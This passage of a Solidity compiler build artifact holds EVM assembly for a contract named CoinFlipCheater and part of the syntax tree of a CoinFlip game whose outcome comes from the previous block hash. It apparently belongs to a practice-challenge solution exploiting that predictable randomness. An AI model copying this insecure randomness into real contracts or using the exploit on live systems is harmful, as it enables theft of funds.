											"begin": 379,
											"end": 401,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 350,
											"end": 411,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "22"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "tag",
											"source": 2,
											"value": "28"
										},
										{
											"begin": 350,
											"end": 411,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 340,
											"end": 411,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 340,
											"end": 411,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 296,
											"end": 421,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 224,
											"end": 428,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 434,
											"end": 543,
											"name": "tag",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 434,
											"end": 543,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 515,
											"end": 536,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 530,
											"end": 535,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 515,
											"end": 536,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "tag",
											"source": 2,
											"value": "31"
										},
										{
											"begin": 515,
											"end": 536,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 510,
											"end": 513,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 503,
											"end": 537,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 493,
											"end": 543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 493,
											"end": 543,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 493,
											"end": 543,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 549,
											"end": 759,
											"name": "tag",
											"source": 2,
											"value": "7"
										},
										{
											"begin": 549,
											"end": 759,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 549,
											"end": 759,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 674,
											"end": 676,
											"name": "PUSH",
											"source": 2,
											"value": "20"
										},
										{
											"begin": 663,
											"end": 672,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 659,
											"end": 677,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 651,
											"end": 677,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 651,
											"end": 677,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 687,
											"end": 752,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 749,
											"end": 750,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 738,
											"end": 747,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 734,
											"end": 751,
											"name": "ADD",
											"source": 2
										},
										{
											"begin": 725,
											"end": 731,
											"name": "DUP5",
											"source": 2
										},
										{
											"begin": 687,
											"end": 752,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "29"
										},
										{
											"begin": 687,
											"end": 752,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 687,
											"end": 752,
											"name": "tag",
											"source": 2,
											"value": "34"
										},
										{
											"begin": 687,
											"end": 752,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 641,
											"end": 759,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 641,
											"end": 759,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 641,
											"end": 759,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 641,
											"end": 759,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 641,
											"end": 759,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 765,
											"end": 950,
											"name": "tag",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 765,
											"end": 950,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 765,
											"end": 950,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 840,
											"end": 841,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 822,
											"end": 842,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "tag",
											"source": 2,
											"value": "36"
										},
										{
											"begin": 822,
											"end": 842,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 817,
											"end": 842,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 817,
											"end": 842,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 856,
											"end": 876,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 874,
											"end": 875,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 856,
											"end": 876,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 856,
											"end": 876,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 856,
											"end": 876,
											"name": "tag",
											"source": 2,
											"value": "38"
										},
										{
											"begin": 856,
											"end": 876,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 851,
											"end": 876,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 851,
											"end": 876,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 895,
											"end": 896,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 885,
											"end": 887,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 885,
											"end": 887,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 900,
											"end": 918,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "tag",
											"source": 2,
											"value": "40"
										},
										{
											"begin": 900,
											"end": 918,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 885,
											"end": 887,
											"name": "tag",
											"source": 2,
											"value": "39"
										},
										{
											"begin": 885,
											"end": 887,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 942,
											"end": 943,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 939,
											"end": 940,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 935,
											"end": 944,
											"name": "DIV",
											"source": 2
										},
										{
											"begin": 930,
											"end": 944,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 930,
											"end": 944,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 807,
											"end": 950,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 807,
											"end": 950,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 807,
											"end": 950,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 807,
											"end": 950,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 807,
											"end": 950,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 956,
											"end": 1147,
											"name": "tag",
											"source": 2,
											"value": "10"
										},
										{
											"begin": 956,
											"end": 1147,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 956,
											"end": 1147,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 1034,
											"end": 1035,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "tag",
											"source": 2,
											"value": "43"
										},
										{
											"begin": 1016,
											"end": 1036,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1011,
											"end": 1036,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1011,
											"end": 1036,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 1068,
											"end": 1069,
											"name": "DUP4",
											"source": 2
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "tag",
											"source": 2,
											"value": "44"
										},
										{
											"begin": 1050,
											"end": 1070,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1045,
											"end": 1070,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1045,
											"end": 1070,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1089,
											"end": 1090,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1086,
											"end": 1087,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1083,
											"end": 1091,
											"name": "LT",
											"source": 2
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "tag",
											"source": 2,
											"value": "46"
										},
										{
											"begin": 1094,
											"end": 1112,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "tag",
											"source": 2,
											"value": "45"
										},
										{
											"begin": 1080,
											"end": 1082,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1139,
											"end": 1140,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1136,
											"end": 1137,
											"name": "DUP3",
											"source": 2
										},
										{
											"begin": 1132,
											"end": 1141,
											"name": "SUB",
											"source": 2
										},
										{
											"begin": 1124,
											"end": 1141,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1124,
											"end": 1141,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "SWAP3",
											"source": 2
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1001,
											"end": 1147,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1153,
											"end": 1243,
											"name": "tag",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 1153,
											"end": 1243,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1153,
											"end": 1243,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1230,
											"end": 1235,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1223,
											"end": 1236,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1216,
											"end": 1237,
											"name": "ISZERO",
											"source": 2
										},
										{
											"begin": 1205,
											"end": 1237,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1205,
											"end": 1237,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1195,
											"end": 1243,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1249,
											"end": 1326,
											"name": "tag",
											"source": 2,
											"value": "37"
										},
										{
											"begin": 1249,
											"end": 1326,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1249,
											"end": 1326,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1315,
											"end": 1320,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1304,
											"end": 1320,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1304,
											"end": 1320,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "SWAP2",
											"source": 2
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "SWAP1",
											"source": 2
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1294,
											"end": 1326,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										},
										{
											"begin": 1332,
											"end": 1512,
											"name": "tag",
											"source": 2,
											"value": "47"
										},
										{
											"begin": 1332,
											"end": 1512,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1380,
											"end": 1457,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1377,
											"end": 1378,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1370,
											"end": 1458,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1477,
											"end": 1481,
											"name": "PUSH",
											"source": 2,
											"value": "11"
										},
										{
											"begin": 1474,
											"end": 1475,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 1467,
											"end": 1482,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1501,
											"end": 1505,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1498,
											"end": 1499,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1491,
											"end": 1506,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1518,
											"end": 1698,
											"name": "tag",
											"source": 2,
											"value": "41"
										},
										{
											"begin": 1518,
											"end": 1698,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1566,
											"end": 1643,
											"name": "PUSH",
											"source": 2,
											"value": "4E487B7100000000000000000000000000000000000000000000000000000000"
										},
										{
											"begin": 1563,
											"end": 1564,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1556,
											"end": 1644,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1663,
											"end": 1667,
											"name": "PUSH",
											"source": 2,
											"value": "12"
										},
										{
											"begin": 1660,
											"end": 1661,
											"name": "PUSH",
											"source": 2,
											"value": "4"
										},
										{
											"begin": 1653,
											"end": 1668,
											"name": "MSTORE",
											"source": 2
										},
										{
											"begin": 1687,
											"end": 1691,
											"name": "PUSH",
											"source": 2,
											"value": "24"
										},
										{
											"begin": 1684,
											"end": 1685,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1677,
											"end": 1692,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1704,
											"end": 1820,
											"name": "tag",
											"source": 2,
											"value": "25"
										},
										{
											"begin": 1704,
											"end": 1820,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1789,
											"end": 1794,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "32"
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "JUMP",
											"source": 2,
											"value": "[in]"
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "tag",
											"source": 2,
											"value": "53"
										},
										{
											"begin": 1774,
											"end": 1795,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1767,
											"end": 1772,
											"name": "DUP2",
											"source": 2
										},
										{
											"begin": 1764,
											"end": 1796,
											"name": "EQ",
											"source": 2
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "PUSH [tag]",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "JUMPI",
											"source": 2
										},
										{
											"begin": 1810,
											"end": 1811,
											"name": "PUSH",
											"source": 2,
											"value": "0"
										},
										{
											"begin": 1807,
											"end": 1808,
											"name": "DUP1",
											"source": 2
										},
										{
											"begin": 1800,
											"end": 1812,
											"name": "REVERT",
											"source": 2
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "tag",
											"source": 2,
											"value": "54"
										},
										{
											"begin": 1754,
											"end": 1756,
											"name": "JUMPDEST",
											"source": 2
										},
										{
											"begin": 1744,
											"end": 1820,
											"name": "POP",
											"source": 2
										},
										{
											"begin": 1744,
											"end": 1820,
											"name": "JUMP",
											"source": 2,
											"value": "[out]"
										}
									]
								}
							}
						},
						"methodIdentifiers": {
							"cheat()": "aa1b510e"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.0+commit.c7dfd78e\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"inputs\":[],\"name\":\"cheat\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{},\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{},\"version\":1}},\"settings\":{\"compilationTarget\":{\"contracts/CoinFlipCheater.sol\":\"CoinFlipCheater\"},\"evmVersion\":\"istanbul\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"contracts/CoinFlip.sol\":{\"keccak256\":\"0xb95bc60e86408dd64b7966baa45eb5ef0590ec2c19e5975041c52077a4f87bcd\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://087f97fd09c887feeee644218608b55eed2ece4776a3cdf6fcc369e69819421e\",\"dweb:/ipfs/QmZKXyRfvRUud7RoWu64WgPhnPA3UrufZsRdLJ5XDYgRr2\"]},\"contracts/CoinFlipCheater.sol\":{\"keccak256\":\"0x63c6ff258ee61149399ace5245de300087c2d96b30574a5baaee897f6abfa89e\",\"license\":\"MIT\",\"urls\":[\"bzz-raw://2d0c1eba0ba236268ed717bd83d0851127a434669e56500182f29afaf75afac0\",\"dweb:/ipfs/QmPeMM4YWSSmaTafEPJynzCFwut9XHPSt35FcXgwWhFdYz\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [
							{
								"astId": 91,
								"contract": "contracts/CoinFlipCheater.sol:CoinFlipCheater",
								"label": "FACTOR",
								"offset": 0,
								"slot": "0",
								"type": "t_uint256"
							},
							{
								"astId": 94,
								"contract": "contracts/CoinFlipCheater.sol:CoinFlipCheater",
								"label": "coinFlipAddress",
								"offset": 0,
								"slot": "1",
								"type": "t_address"
							}
						],
						"types": {
							"t_address": {
								"encoding": "inplace",
								"label": "address",
								"numberOfBytes": "20"
							},
							"t_uint256": {
								"encoding": "inplace",
								"label": "uint256",
								"numberOfBytes": "32"
							}
						}
					},
					"userdoc": {
						"kind": "user",
						"methods": {},
						"version": 1
					}
				}
			}
		},
		"sources": {
			"contracts/CoinFlip.sol": {
				"ast": {
					"absolutePath": "contracts/CoinFlip.sol",
					"exportedSymbols": {
						"CoinFlip": [
							81
						]
					},
					"id": 82,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 1,
							"literals": [
								"solidity",
								"^",
								"0.8",
								".0"
							],
							"nodeType": "PragmaDirective",
							"src": "32:23:0"
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"fullyImplemented": true,
							"id": 81,
							"linearizedBaseContracts": [
								81
							],
							"name": "CoinFlip",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"constant": false,
									"functionSelector": "e6f334d7",
									"id": 3,
									"mutability": "mutable",
									"name": "consecutiveWins",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "80:30:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 2,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "80:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 5,
									"mutability": "mutable",
									"name": "lastHash",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "114:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 4,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "114:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 8,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"scope": 81,
									"src": "134:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 6,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "134:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 7,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "151:77:0",
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"body": {
										"id": 15,
										"nodeType": "Block",
										"src": "247:30:0",
										"statements": [
											{
												"expression": {
													"id": 13,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"id": 11,
														"name": "consecutiveWins",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 3,
														"src": "253:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"hexValue": "30",
														"id": 12,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"kind": "number",
														"lValueRequested": false,
														"nodeType": "Literal",
														"src": "271:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_rational_0_by_1",
															"typeString": "int_const 0"
														},
														"value": "0"
													},
													"src": "253:19:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 14,
												"nodeType": "ExpressionStatement",
												"src": "253:19:0"
											}
										]
									},
									"id": 16,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "244:2:0"
									},
									"returnParameters": {
										"id": 10,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "247:0:0"
									},
									"scope": 81,
									"src": "233:44:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 79,
										"nodeType": "Block",
										"src": "330:380:0",
										"statements": [
											{
												"assignments": [
													24
												],
												"declarations": [
													{
														"constant": false,
														"id": 24,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"scope": 79,
														"src": "336:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 23,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "336:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"visibility": "internal"
													}
												],
												"id": 34,
												"initialValue": {
													"arguments": [
														{
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 31,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"expression": {
																			"id": 28,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": 4294967292,
																			"src": "375:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 29,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"src": "375:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"hexValue": "31",
																		"id": 30,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "390:1:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "375:16:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 27,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 4294967291,
																"src": "365:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 32,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "365:27:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 26,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "357:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 25,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "357:7:0",
															"typeDescriptions": {}
														}
													},
													"id": 33,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "357:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "336:57:0"
											},
											{
												"condition": {
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 37,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"id": 35,
														"name": "lastHash",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 5,
														"src": "404:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "==",
													"rightExpression": {
														"id": 36,
														"name": "blockValue",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 24,
														"src": "416:10:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "404:22:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 42,
												"nodeType": "IfStatement",
												"src": "400:51:0",
												"trueBody": {
													"id": 41,
													"nodeType": "Block",
													"src": "428:23:0",
													"statements": [
														{
															"expression": {
																"arguments": [],
																"expression": {
																	"argumentTypes": [],
																	"id": 38,
																	"name": "revert",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [
																		4294967277,
																		4294967277
																	],
